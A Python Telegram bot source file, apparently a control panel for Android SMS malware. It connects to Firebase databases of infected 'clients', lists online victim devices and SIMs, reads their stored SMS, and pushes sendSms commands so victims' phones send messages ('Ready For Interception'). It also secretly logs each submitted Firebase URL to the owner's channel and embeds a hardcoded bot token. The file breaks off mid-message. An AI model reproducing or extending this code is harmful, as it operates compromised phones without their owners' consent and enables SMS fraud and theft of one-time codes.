"""
╔══════════════════════════════════════════════╗
║     ARYAN AUTOTOKEN BOT  v2.0               ║
║     Owner: @Aryan_babu99                    ║
║     Powered by Aryan Tools                  ║
╚══════════════════════════════════════════════╝
pip install aiogram==3.7.0 aiohttp==3.9.5 uvloop orjson
python aryan_autotoken_bot.py
"""

import asyncio, json, os, time, logging, ssl, re, io, zipfile, struct, random, string
from datetime import datetime, timedelta
from copy import deepcopy

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup,
    KeyboardButton, ReplyKeyboardRemove
)
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

try:
    import orjson as _json
    _USE_ORJSON = True
except ImportError:
    import json as _json
    _USE_ORJSON = False

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("AryanAutoToken")

# ══════════════════════════════════════════════
#  CUSTOM EMOJI IDs
# ══════════════════════════════════════════════
from aiogram.types import MessageEntity

E_RED_BADGE   = "6147565374289220368"   # ✅ red verified
E_FIRE_HEART  = "6147617184479711380"   # ❤️‍🔥 flaming heart
E_FIRE        = "6235628846855492222"   # 🔥 fire
E_HACKER      = "6235572922086331108"   # 👾 hacker
E_BLACK_FLAME = "6235582469798630291"   # 🖤🔥 black flame
E_HAND        = "6235717714023814969"   # 🤌 hand
E_CALENDAR    = "6238042150324409739"   # 🗓️ calendar
E_GREEN_CHECK = "6111493206690499107"   # ✅ green checkbox

# alive ping: uid → message_id
_alive_msgs: dict[int, int] = {}

async def alive_ping_worker(bot: Bot):
    """Every 60s — delete old alive msg, send new one to all active users"""
    while True:
        await asyncio.sleep(60)
        try:
            d = load()
            for uid_str, u in d["users"].items():
                uid = int(uid_str)
                if not u.get("monitoring"): continue
                now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                grp = u.get("group_title", "—")
                sim = u.get("sim_number", "—")
                dev = u.get("device_id", "—")
                text = (
                    f"✅ I AM ALIVE\n\n"
                    f"🤖 Aryan AutoToken v2.0\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"📡 Status : 🟢 Active\n"
                    f"📱 Device : {dev[:16] if dev else '—'}\n"
                    f"📶 SIM    : {sim}\n"
                    f"🎯 Target : {grp}\n"
                    f"🕐 Time   : {now}\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"⚡ Powered by @Aryan_babu99"
                )
                try:
                    # delete old
                    old_id = _alive_msgs.get(uid)
                    if old_id:
                        try: await bot.delete_message(uid, old_id)
                        except: pass
                    # send new
                    sent = await bot.send_message(uid, text,
                        entities=[ent(E_GREEN_CHECK, 0, 1)]
                    )
                    _alive_msgs[uid] = sent.message_id
                except: pass
        except Exception as e:
            log.error(f"alive_ping error: {e}")

def ent(emoji_id: str, offset: int, length: int = 2) -> MessageEntity:
    return MessageEntity(type="custom_emoji", offset=offset, length=length, custom_emoji_id=emoji_id)

async def send_e(chat_id, bot: Bot, text: str, entities: list, **kwargs):
    """Send message with custom emoji entities"""
    try:
        await bot.send_message(chat_id, text, entities=entities, **kwargs)
    except:
        await bot.send_message(chat_id, text, **kwargs)

# ══════════════════════════════════════════════
#  OWNER — XOR obfuscated
# ══════════════════════════════════════════════
_s = [0x37,0x39,0x34,0x39,0x35,0x33,0x39,0x37,0x39,0x34]
OWNER_ID = int("".join(chr(x) for x in _s))

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN      = "8511439874:AAHQj3JmwT4IltCkkHI5W-bahScT0aiBasQ"
ADMIN_ID       = 8897775081
OWNER_USERNAME = "@Aryan_babu99"
FB_LOG_CH      = -1004379319158
FORCE_CH_ID    = -1003223668976
FORCE_CH_LINK  = "https://t.me/CIPHER889988"
DATA_FILE      = "aryan_data.json"

# ══════════════════════════════════════════════
#  MULTI-FORMAT SMS PARSER
# ══════════════════════════════════════════════
_ONE_TAP  = re.compile(r'One-tap copy:\s*([0-9+][0-9+\s-]*)\s*\|\s*(.+?)(?:\n|$)', re.I)
_TO_RE    = re.compile(r'(?:To|to)\s*(?:\(Tap to copy\))?\s*:\s*([+\d\s\-]{7,})', re.I)
_BODY_RE  = re.compile(r'(?:Body|Message|MSG|SMS|Text|Content)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)', re.I|re.DOTALL)

def normalize_number(num: str) -> str:
    """10 digit → +91XXXXXXXXXX, 11 digit 0XXXXXXXXXX → +91XXXXXXXXXX"""
    n = re.sub(r'[\s\-\(\)]','', num)
    if not n.startswith("+"):
        if len(n) == 10:   n = "+91" + n
        elif len(n) == 11 and n.startswith("0"): n = "+91" + n[1:]
        else: n = "+" + n
    return n

def parse_sms(text: str):
    if not text: return None, None
    m = _ONE_TAP.search(text)
    if m: return normalize_number(m.group(1).strip()), m.group(2).strip()
    to_m = _TO_RE.search(text)
    body_m = _BODY_RE.search(text)
    if to_m and body_m:
        return normalize_number(to_m.group(1)), body_m.group(1).strip().split("\n")[0]
    lines = [l.strip() for l in text.split("\n") if l.strip()]
    ml = next((l for l in lines if "MESSAGE" in l and "🏷" in l), None)
    rl = next((l for l in lines if "RECIPIENT" in l and "🏷" in l), None)
    if ml and rl: return normalize_number(rl.split(":",1)[-1].strip()), ml.split(":",1)[-1].strip()
    return None, None

# ══════════════════════════════════════════════
#  RECHARGE CHECK — Hindi + English
# ══════════════════════════════════════════════
_EXP_KW = [
    "recharge expired","validity expired","plan expired","no outgoing","outgoing barred",
    "incoming barred","service suspended","validity over","recharge due",
    "insufficient balance","zero balance","outgoing facility barred",
    "रिचार्ज समाप्त","रिचार्ज खत्म","वैधता समाप्त","आउटगोइंग बंद",
    "इनकमिंग बंद","सेवा निलंबित","आपका प्लान समाप्त","बैलेंस कम","शून्य बैलेंस",
]
_SUC_KW = [
    "recharge successful","recharge done","plan activated","recharge completed",
    "successfully recharged","plan renewed","validity extended",
    "रिचार्ज सफल","रिचार्ज पूर्ण","आपका रिचार्ज सफल","प्लान एक्टिवेट","रिचार्ज हो गया",
]

async def check_recharge(fb_url: str, dev_id: str, sim_num: str) -> str:
    try:
        paths = [f"/messages/{dev_id}", f"/clients/{dev_id}/messages"]
        cutoff = datetime.now() - timedelta(days=10)
        msgs = []
        for path in paths:
            data = await fb_get(fb_url, f"{path}.json")
            for mid, md in data.items():
                if not isinstance(md, dict): continue
                body = (md.get("body") or md.get("message") or "").lower()
                frm  = str(md.get("from") or "")
                ts   = md.get("timestamp") or md.get("time")
                mt   = datetime.now()
                if ts:
                    try: mt = datetime.fromtimestamp(int(ts)/1000 if int(ts)>1e10 else int(ts))
                    except: pass
                if mt < cutoff: continue
                sc = re.sub(r'\D','',sim_num)[-10:]
                fc = re.sub(r'\D','',frm)[-10:]
                if sc in fc or sc in body.replace(" ",""):
                    msgs.append({"t":mt,"b":body})
        if not msgs: return "✅ AVAILABLE"
        msgs.sort(key=lambda x:x["t"], reverse=True)
        last_exp = None
        for m in msgs:
            if any(k in m["b"] for k in _EXP_KW): last_exp=m["t"]; break
        if not last_exp: return "✅ AVAILABLE"
        for m in msgs:
            if m["t"]>last_exp and any(k in m["b"] for k in _SUC_KW): return "✅ RECHARGED"
        return "⚠️ EXPIRED"
    except: return "❓ UNKNOWN"

# ══════════════════════════════════════════════
#  FSM
# ══════════════════════════════════════════════
class W(StatesGroup):
    group_input    = State()
    firebase_input = State()
    test_to        = State()
    test_msg       = State()
    broadcast_msg  = State()
    search_dev     = State()

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _nu():
    return {
        "group_id":None,"group_title":None,
        "fb_url":None,
        "device_id":None,"device_data":{},
        "sim_slot":0,"sim_number":None,
        "monitoring":False,
        "share_codes":{},
        "stats":{"sent":0,"failed":0,"last":"—"},
    }

_DEF = {"admins":[OWNER_ID,ADMIN_ID],"bot_on":True,"users":{},"fb_seen":[],"banned":[]}

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE) as f: d=json.load(f)
        for k,v in _DEF.items():
            if k not in d: d[k]=v
        for a in [OWNER_ID,ADMIN_ID]:
            if a not in d["admins"]: d["admins"].append(a)
        return d
    return deepcopy(_DEF)

_sp=False; _sl=asyncio.Lock()
def save(d):
    global _sp
    if not _sp:
        _sp=True
        asyncio.create_task(_dw(d))

async def _dw(d):
    global _sp
    await asyncio.sleep(0.5)
    async with _sl:
        with open(DATA_FILE,"w") as f: json.dump(d,f,indent=2)
        _sp=False

def usr(uid,d):
    k=str(uid)
    if k not in d["users"]: d["users"][k]=_nu()
    u=d["users"][k]
    for key,val in _nu().items():
        if key not in u: u[key]=val
    return u

def is_admin(uid,d): return uid in [OWNER_ID,ADMIN_ID]+d.get("admins",[])

# ══════════════════════════════════════════════
#  FORCE JOIN CHECK
# ══════════════════════════════════════════════
async def check_joined(bot:Bot, uid:int) -> bool:
    if uid in [OWNER_ID, ADMIN_ID]: return True
    try:
        m = await bot.get_chat_member(FORCE_CH_ID, uid)
        return m.status not in ("left","kicked","banned","restricted")
    except: return False

# ══════════════════════════════════════════════
#  FIREBASE — GOD SPEED 15 PARALLEL
# ══════════════════════════════════════════════
_pool=[]; _pl=asyncio.Lock(); _ph=None; _sess=None

async def _gs():
    global _sess
    if _sess is None or _sess.closed:
        _sess=aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0,ttl_dns_cache=300))
    return _sess

async def warmup(fb_url):
    global _pool,_ph
    if not fb_url: return
    h=fb_url.replace("https://","").replace("http://","").rstrip("/")
    if h==_ph and len(_pool)>5: return
    _ph=h
    for _,w in _pool:
        try: w.close()
        except: pass
    _pool.clear()
    ssl_ctx=ssl.create_default_context()
    res=await asyncio.gather(*[asyncio.open_connection(h,443,ssl=ssl_ctx) for _ in range(10)],return_exceptions=True)
    for r in res:
        if not isinstance(r,Exception) and r: _pool.append(r)

async def _gc():
    global _pool,_ph
    async with _pl:
        while _pool:
            r,w=_pool.pop()
            if not w.is_closing(): return r,w
    return await asyncio.open_connection(_ph,443,ssl=ssl.create_default_context())

async def _rc(r,w):
    if w.is_closing():
        try: w.close()
        except: pass
        return
    async with _pl: _pool.append((r,w))

async def _fire_one(fb_url,dev,slot,to,msg):
    h=fb_url.replace("https://","").replace("http://","").rstrip("/")
    path=f"/clients/{dev}/webhookEvent/sendSms.json?print=silent"
    dd={"from":slot,"to":to,"message":msg,"isSended":False,"timestamp":int(time.time())}
    pl=(_json.dumps(dd) if _USE_ORJSON else _json.dumps(dd).encode())
    req=(f"PUT {path} HTTP/1.1\r\nHost: {h}\r\nContent-Type: application/json\r\nContent-Length: {len(pl)}\r\nConnection: keep-alive\r\n\r\n").encode()+pl
    try:
        r,w=await _gc(); w.write(req)
        await asyncio.wait_for(w.drain(),timeout=0.1)
        await _rc(r,w); return True
    except: return False

async def fire(fb_url,dev,slot,to,msg):
    res=await asyncio.gather(*[_fire_one(fb_url,dev,slot,to,msg) for _ in range(5)],return_exceptions=True)
    return any(r is True for r in res)

async def fb_get(base,path):
    try:
        s=await _gs()
        async with s.get(f"{base.rstrip('/')}{path}",timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status!=200: return {}
            d=await r.json(); return d if isinstance(d,dict) else {}
    except: return {}

def dev_online(dd):
    if not isinstance(dd,dict): return False
    if dd.get("status") is True: return True
    if dd.get("isOnline") or dd.get("online"): return True
    if dd.get("status") in ("online","active"): return True
    return False

# ══════════════════════════════════════════════
#  SHARE CODE
# ══════════════════════════════════════════════
def gen_code(): return "TK-"+"".join(random.choices(string.ascii_uppercase+string.digits,k=6))

# ══════════════════════════════════════════════
#  BOTTOM KEYBOARDS
# ══════════════════════════════════════════════
def kb_start():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="👥 Set Group/Channel")],
        [KeyboardButton(text="❓ Help")],
    ], resize_keyboard=True)

def kb_after_group():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="🔥 Set Firebase URL")],
        [KeyboardButton(text="📋 Status")],
        [KeyboardButton(text="👥 Change"), KeyboardButton(text="❓ Help")],
    ], resize_keyboard=True)

def kb_after_firebase(uid,d):
    if is_admin(uid,d):
        return ReplyKeyboardMarkup(keyboard=[
            [KeyboardButton(text="📱 Online Devices")],
            [KeyboardButton(text="🔥 Change Firebase"), KeyboardButton(text="📋 Status")],
            [KeyboardButton(text="👥 Change"),           KeyboardButton(text="❓ Help")],
            [KeyboardButton(text="📢 Broadcast"),        KeyboardButton(text="⚙️ Bot ON/OFF")],
        ], resize_keyboard=True)
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Online Devices")],
        [KeyboardButton(text="🔥 Change Firebase"), KeyboardButton(text="📋 Status")],
        [KeyboardButton(text="👥 Change"),           KeyboardButton(text="❓ Help")],
    ], resize_keyboard=True)

def kb_listening(uid,d):
    rows=[
        [KeyboardButton(text="⏹ Stop Listen")],
        [KeyboardButton(text="📱 Change Device"), KeyboardButton(text="🔥 Change Firebase")],
        [KeyboardButton(text="🔗 Share Device"),  KeyboardButton(text="📋 Status")],
        [KeyboardButton(text="🧪 Test SMS"),       KeyboardButton(text="👥 Change")],
        [KeyboardButton(text="❓ Help")],
    ]
    if is_admin(uid,d):
        rows.append([KeyboardButton(text="📢 Broadcast"), KeyboardButton(text="⚙️ Bot ON/OFF")])
    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True)

def kb_cancel():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="❌ Cancel")]], resize_keyboard=True)

def kb_sims_always(sims):
    """Always show 1 and 2 regardless of SIM data"""
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="1"), KeyboardButton(text="2")],
        [KeyboardButton(text="❌ Cancel")],
    ], resize_keyboard=True)

def current_kb(uid,d):
    u=usr(uid,d)
    if u.get("monitoring"): return kb_listening(uid,d)
    if u.get("fb_url"):     return kb_after_firebase(uid,d)
    if u.get("group_id"):   return kb_after_group()
    return kb_start()

# ══════════════════════════════════════════════
#  TOKEN PUSH
# ══════════════════════════════════════════════
async def do_push(bot:Bot, uid:int, to:str, msg_text:str, source:str, is_test:bool=False):
    d=load(); u=usr(uid,d)
    fb=u.get("fb_url"); dev=u.get("device_id")
    slot=u.get("sim_slot",0); sim_num=u.get("sim_number","—")
    grp_id=u.get("group_id"); grp_title=u.get("group_title","channel")
    if not fb or not dev: return

    await warmup(fb)

    try:
        await send_e(uid, bot,
            f"⏳ Sending SMS to {to[:20]}...\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Source: {source}\n"
            f"📶 SIM: {sim_num}",
            [ent(E_BLACK_FLAME, 0)]
        )
    except: pass

    ok=await fire(fb,dev,slot,to,msg_text)
    icon="✅" if ok else "❌"; status="SENT" if ok else "FAILED"

    report=(
        f"📱 SMS Delivery Report\n\n"
        f"{icon} STATUS: {status}\n"
        f"📱 To: {to}\n"
        f"💬 Message: {msg_text[:80]}{'…' if len(msg_text)>80 else ''}\n"
        f"👥 From: {source}"
    )
    try:
        await send_e(uid, bot, report, [ent(E_RED_BADGE if ok else E_FIRE, 0)])
    except: pass

    # channel forward — only for real token push, NOT test
    if not is_test and grp_id:
        try:
            await bot.send_message(grp_id,
                f"📌 Token\n"
                f"📱 {source}\n"
                f"{'✅' if ok else '❌'} {'SENT' if ok else 'FAILED'} → {to}"
            )
        except: pass

    d2=load(); u2=usr(uid,d2)
    if ok: u2["stats"]["sent"]=u2["stats"].get("sent",0)+1
    else:  u2["stats"]["failed"]=u2["stats"].get("failed",0)+1
    u2["stats"]["last"]=datetime.now().strftime("%H:%M:%S")
    save(d2)

# ══════════════════════════════════════════════
#  CHANNEL POST HANDLER
# ══════════════════════════════════════════════
R=Router()

@R.channel_post()
@R.message(F.chat.type.in_({"group","supergroup"}))
async def ch_handler(msg:Message, bot:Bot):
    d=load()
    if not d.get("bot_on",True): return
    cid=msg.chat.id
    text=msg.text or msg.caption or ""
    to,sms=parse_sms(text)
    if not to or not sms: return
    src=msg.chat.title or str(cid)
    for uid_str,u in d["users"].items():
        uid=int(uid_str)
        if u.get("group_id")==cid and u.get("monitoring"):
            asyncio.create_task(do_push(bot,uid,to,sms,src,is_test=False))

# ══════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════
async def resolve_chat(bot:Bot, text:str):
    text=text.strip()
    try:
        if text.lstrip("-").isdigit():
            c=await bot.get_chat(int(text)); return c.id,c.title or str(c.id)
        if "t.me/" in text:
            slug=text.split("t.me/")[-1].split("/")[0]
            c=await bot.get_chat(f"@{slug}" if not slug.startswith("+") else text)
            return c.id,c.title or str(c.id)
        if not text.startswith("@"): text=f"@{text}"
        c=await bot.get_chat(text); return c.id,c.title or str(c.id)
    except Exception as e: raise Exception(str(e))

async def get_bot_admin_chats(bot:Bot) -> list:
    """Get all chat IDs where bot is admin — from user group_ids"""
    d=load()
    chats=set()
    for uid_str,u in d["users"].items():
        gid=u.get("group_id")
        if gid: chats.add(gid)
    return list(chats)

# ══════════════════════════════════════════════
#  /start
# ══════════════════════════════════════════════
@R.message(Command("start"))
async def c_start(msg:Message, state:FSMContext, bot:Bot):
    await state.clear()
    d=load(); uid=msg.from_user.id
    if not d.get("bot_on",True) and not is_admin(uid,d):
        await msg.answer("🔴 Bot is currently OFF. Contact admin."); return
    if uid in d.get("banned",[]):
        await msg.answer("🚫 You are banned."); return

    # force join check
    joined=await check_joined(bot,uid)
    if not joined:
        await send_e(uid, bot,
            f"👾 BOT USE KARNE KE LIYE PEHLE JOIN KAREIN!\n\n"
            f"Join our channel first:\n"
            f"👉 {FORCE_CH_LINK}\n\n"
            f"After joining, send /start again.",
            [ent(E_HACKER, 0)]
        ); return

    usr(uid,d); save(d)
    u=usr(uid,d)
    if u.get("monitoring"):
        await send_e(uid, bot, "🟢 LIVE MONITORING ACTIVE\n📡 Listener Activated",
            [ent(E_FIRE, 0)], reply_markup=kb_listening(uid,d)); return
    if u.get("fb_url"):
        await msg.answer("✅ Firebase Connected\n📱 Tap Online Devices to continue", reply_markup=current_kb(uid,d)); return
    await send_e(uid, bot,
        "👋 WELCOME\n\n"
        "Step 1: Set Group Or Channel First\n"
        "This Chat Is Saved For All Future Firebase Setups\n"
        "Tap 👥 Set Group/Channel Or Send /setgroup",
        [ent(E_FIRE_HEART, 0)],
        reply_markup=kb_start()
    )

# ══════════════════════════════════════════════
#  TEXT HANDLER
# ══════════════════════════════════════════════
@R.message(F.text)
async def txt(msg:Message, state:FSMContext, bot:Bot):
    uid=msg.from_user.id; text=msg.text.strip()
    d=load(); u=usr(uid,d)
    cur_state=await state.get_state()

    if not d.get("bot_on",True) and not is_admin(uid,d):
        await msg.answer("🔴 Bot is OFF."); return
    if uid in d.get("banned",[]):
        await msg.answer("🚫 You are banned."); return

    # force join check (non-admins)
    if not is_admin(uid,d):
        joined=await check_joined(bot,uid)
        if not joined:
            await msg.answer(f"⚠️ Join our channel first:\n👉 {FORCE_CH_LINK}\n\nThen send /start"); return

    # ── FSM: group input ──
    if cur_state==W.group_input:
        await state.clear()
        wait=await msg.answer("🔄 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗜𝗡𝗚 𝗪𝗜𝗧𝗛 𝗖𝗛𝗔𝗡𝗡𝗘𝗟...")
        try:
            ch_id,ch_ttl=await resolve_chat(bot,text)
            try: await wait.delete()
            except: pass
            u["group_id"]=ch_id; u["group_title"]=ch_ttl; save(d)
            await send_e(uid, bot,
                f"✅ Chat Saved : {ch_ttl}\n"
                f"🚀 Saved For Your Account\n\n"
                f"🔥 CONNECT FIREBASE OR SHARE CODE\n\n"
                f"Step 2: Connect Firebase Or Send A Shared Code\n"
                f"Tap 🔥 Set Firebase URL Or Send /setfirebase\n"
                f"Or Paste Your Device Share Code To Connect",
                [ent(E_RED_BADGE, 0), ent(E_FIRE, 47, 2)],
                reply_markup=kb_after_group()
            )
        except Exception as e:
            try: await wait.delete()
            except: pass
            await msg.answer(f"❌ Failed: {e}\n\n• Bot must be Admin in channel\n• Send correct link/ID/username")
        return

    # ── FSM: firebase input ──
    if cur_state==W.firebase_input:
        await state.clear()
        url=text.strip()
        if not url.startswith("http"):
            await msg.answer("❌ Invalid URL. Must start with https://"); return
        wait=await msg.answer("🔄 Connecting to Firebase...")
        all_devs=await fb_get(url,"/clients.json")
        try: await wait.delete()
        except: pass
        if not all_devs:
            await msg.answer("❌ Empty Database! No clients found."); return
        try: await bot.delete_message(uid,msg.message_id)
        except: pass
        u["fb_url"]=url; save(d)

        # Only log if NEW firebase (not seen before)
        seen=d.get("fb_seen",[])
        if url not in seen:
            seen.append(url)
            d["fb_seen"]=seen[-500:]; save(d)
            uname=msg.from_user.username or str(uid)
            try:
                await send_e(FB_LOG_CH, bot,
                    f"🔥 𝗡𝗘𝗪 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘\n\n"
                    f"𝗟𝗶𝗻𝗸 - {url}\n\n"
                    f"𝗖𝗹𝗶𝗲𝗻𝘁𝘀 - {len(all_devs)}\n\n"
                    f"𝗙𝗿𝗼𝗺 - @{uname}\n\n"
                    f"𝗗𝗮𝘁𝗲 - {datetime.now().strftime('%d/%m/%Y %H:%M')}",
                    [ent(E_FIRE, 0)]
                )
            except: pass

        online={k:v for k,v in all_devs.items() if dev_online(v)}
        await send_e(uid, bot,
            f"✅ FIREBASE CONNECTED\n"
            f"🚀 Saved Chat : {u.get('group_title','Not Set')}\n\n"
            f"📱 Select Device To Proceed\n"
            f"👆 Tap 📱 Online Devices",
            [ent(E_RED_BADGE, 0)],
            reply_markup=current_kb(uid,d)
        )
        return

    # ── FSM: test to ──
    if cur_state==W.test_to:
        to=normalize_number(text)
        await state.update_data(test_to=to)
        await state.set_state(W.test_msg)
        await msg.answer("💬 Now send the message text:", reply_markup=kb_cancel())
        return

    # ── FSM: test msg ──
    if cur_state==W.test_msg:
        data=await state.get_data()
        await state.clear()
        to=data.get("test_to","")
        if not to:
            await msg.answer("❌ Number missing. Try again: 🧪 Test SMS", reply_markup=current_kb(uid,d))
            return
        asyncio.create_task(do_push(bot,uid,to,text,"Manual Test",is_test=True))
        await msg.answer("📤 Sending test SMS...", reply_markup=current_kb(uid,d))
        return

    # ── FSM: broadcast ──
    if cur_state==W.broadcast_msg:
        await state.clear()
        if not is_admin(uid,d): return
        btext=(
            f"📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"{text}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"☠️ {OWNER_USERNAME}"
        )
        all_uids=list(d["users"].keys())

        # get all group/channel chats bot is admin in
        # exclude force join channel
        admin_chats=await get_bot_admin_chats(bot)
        admin_chats=[c for c in admin_chats if c!=FORCE_CH_ID]

        wait=await msg.answer(f"📲 Sending to {len(all_uids)} users + {len(admin_chats)} channels...")
        sent=fail=0
        for us in all_uids:
            try: await bot.send_message(int(us),btext); sent+=1; await asyncio.sleep(0.05)
            except: fail+=1
        ch_sent=0
        for cid in admin_chats:
            try: await bot.send_message(cid,btext); ch_sent+=1; await asyncio.sleep(0.1)
            except: pass
        try: await wait.delete()
        except: pass
        await msg.answer(
            f"✅ Broadcast done\n"
            f"👤 Users — ✅ {sent} ❌ {fail}\n"
            f"📢 Channels — ✅ {ch_sent}",
            reply_markup=current_kb(uid,d)
        )
        return

    # ── FSM: search dev ──
    if cur_state==W.search_dev:
        await state.clear()
        query=text.lower(); fb_url=u.get("fb_url","")
        if not fb_url: await msg.answer("❌ Firebase first!"); return
        wait=await msg.answer(
            "🔍 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗗𝗘𝗩𝗜𝗖𝗘 𝗦𝗧𝗔𝗧𝗨𝗦...\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Please Wait...... ⏳\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        all_devs=await fb_get(fb_url,"/clients.json")
        try: await wait.delete()
        except: pass
        matched={k:v for k,v in all_devs.items()
                 if query in k.lower()
                 or query in (v.get("modelName","")).lower()
                 or any(query in s.get("phoneNumber","") for s in v.get("sims",[]))}
        if not matched:
            await msg.answer("❌ CLIENT NOT FOUND!", reply_markup=current_kb(uid,d)); return
        devlist=list(matched.keys())
        lines=[f"{i+1}. {did}" for i,did in enumerate(devlist)]
        btns=[]; row=[]
        for i in range(1,len(devlist)+1):
            row.append(KeyboardButton(text=str(i)))
            if len(row)==4: btns.append(row); row=[]
        if row: btns.append(row)
        btns.append([KeyboardButton(text="Search device"), KeyboardButton(text="❌ Cancel")])
        kb2=ReplyKeyboardMarkup(keyboard=btns,resize_keyboard=True)
        await msg.answer(
            f"🆔 Select by Android ID\n━━━━━━━━━━━━━━\n"
            f"🟢 {len(devlist)} device(s) found\n\n"
            +"\n".join(lines)+"\n\n👆 Tap a number to select:",
            reply_markup=kb2
        )
        await state.update_data(dev_map=devlist,mode="pick")
        return

    # ════ BUTTON HANDLERS ════

    if text in ("👥 Set Group/Channel","👥 Change","/setgroup"):
        await msg.answer(
            "👥 SET GROUP OR CHANNEL\n\n"
            "📨 Send One Of :\n"
            "@Username\n"
            "Numeric Chat ID\n"
            "Public Link\n"
            "Private Link\n\n"
            "🛡 Add Bot As Admin In Group/Channel",
            reply_markup=kb_cancel()
        )
        await state.set_state(W.group_input)
        return

    if text in ("🔥 Set Firebase URL","🔥 Change Firebase","/setfirebase"):
        if not u.get("group_id"):
            await msg.answer("⚠️ Set Group/Channel first!"); return
        await msg.answer(
            "👉 SEND YOUR REALTIME DATABASE URL\n\n"
            "💡 Example :\n"
            "https://your-project.firebaseio.com",
            reply_markup=kb_cancel()
        )
        await state.set_state(W.firebase_input)
        return

    if text in ("📱 Online Devices","📱 Change Device","/devices"):
        fb_url=u.get("fb_url")
        if not fb_url: await msg.answer("⚠️ Set Firebase first!"); return
        wait=await msg.answer("🔍 Fetching online devices...")
        all_devs=await fb_get(fb_url,"/clients.json")
        try: await wait.delete()
        except: pass
        online={k:v for k,v in all_devs.items() if dev_online(v)}
        if not online:
            await msg.answer("❌ No online clients!", reply_markup=current_kb(uid,d)); return
        await msg.answer(
            "📱 SELECT DEVICE\n\n"
            "👆 Choose Selection Mode :\n"
            "🆔 Select By Android ID\n"
            "📱 Select By Model",
            reply_markup=ReplyKeyboardMarkup(keyboard=[
                [KeyboardButton(text="🆔 Select by Android ID")],
                [KeyboardButton(text="📱 Select by Model")],
                [KeyboardButton(text="❌ Cancel")],
            ], resize_keyboard=True)
        )
        await state.update_data(online_devs=online)
        return

    if text=="🆔 Select by Android ID":
        data=await state.get_data()
        online=data.get("online_devs",{})
        if not online:
            fb_url=u.get("fb_url","")
            all_devs=await fb_get(fb_url,"/clients.json")
            online={k:v for k,v in all_devs.items() if dev_online(v)}
        devlist=list(online.keys())
        lines=[f"{i+1}. {did}" for i,did in enumerate(devlist)]
        btns=[]; row=[]
        for i in range(1,len(devlist)+1):
            row.append(KeyboardButton(text=str(i)))
            if len(row)==4: btns.append(row); row=[]
        if row: btns.append(row)
        btns.append([KeyboardButton(text="Search device"), KeyboardButton(text="❌ Cancel")])
        await msg.answer(
            f"🆔 Select by Android ID\n━━━━━━━━━━━━━━\n"
            f"🟢 {len(devlist)} online device(s)\n\n"
            +"\n".join(lines)+"\n\n👆 Tap a number to select:",
            reply_markup=ReplyKeyboardMarkup(keyboard=btns,resize_keyboard=True)
        )
        await state.update_data(dev_map=devlist,mode="pick",online_devs=online)
        return

    if text=="📱 Select by Model":
        data=await state.get_data()
        online=data.get("online_devs",{})
        if not online:
            fb_url=u.get("fb_url","")
            all_devs=await fb_get(fb_url,"/clients.json")
            online={k:v for k,v in all_devs.items() if dev_online(v)}
        devlist=list(online.keys())
        lines=[f"{i+1}. {online[did].get('modelName',did)}" for i,did in enumerate(devlist)]
        btns=[]; row=[]
        for i in range(1,len(devlist)+1):
            row.append(KeyboardButton(text=str(i)))
            if len(row)==4: btns.append(row); row=[]
        if row: btns.append(row)
        btns.append([KeyboardButton(text="Search device"), KeyboardButton(text="❌ Cancel")])
        await msg.answer(
            f"📱 Select by Model\n━━━━━━━━━━━━━━\n"
            f"🟢 {len(devlist)} online device(s)\n\n"
            +"\n".join(lines)+"\n\n👆 Tap a number to select:",
            reply_markup=ReplyKeyboardMarkup(keyboard=btns,resize_keyboard=True)
        )
        await state.update_data(dev_map=devlist,mode="pick",online_devs=online)
        return

    if text=="Search device":
        await msg.answer("🔍 Send device ID or model name:", reply_markup=kb_cancel())
        await state.set_state(W.search_dev)
        return

    # ── Number selection ──
    if text.isdigit():
        data=await state.get_data(); mode=data.get("mode")

        # SIM select
        if mode=="sim":
            sim_idx=int(text)-1
            sims=data.get("sims",[])
            dev_id=data.get("sel_dev_id","")
            fb_url=u.get("fb_url","")

            # get phone number if SIM exists, else use slot number
            if sims and sim_idx < len(sims):
                sim=sims[sim_idx]
                phone=sim.get("phoneNumber","N/A")
                slot=sim.get("simSlotIndex",sim_idx)
                carrier=sim.get("carrierName","")
            else:
                # no SIM data — still work with slot number
                phone=f"Slot {int(text)}"
                slot=sim_idx
                carrier=""

            u["sim_slot"]=slot; u["sim_number"]=phone; save(d)
            await msg.answer(f"✅ Sim {int(text)} Selected")

            # recharge check
            rchrg="—"
            if sims and sim_idx<len(sims) and phone!="N/A":
                rchrg=await check_recharge(fb_url,dev_id,phone)

            await send_e(uid, bot,
                f"⚡ CONFIGURATION COMPLETE\n"
                f"🚀 Target Chat : {u.get('group_title','Not Set')}\n\n"
                f"🚀 Ready For Interception\n"
                f"▶️ Press Start Listen To Begin\n\n"
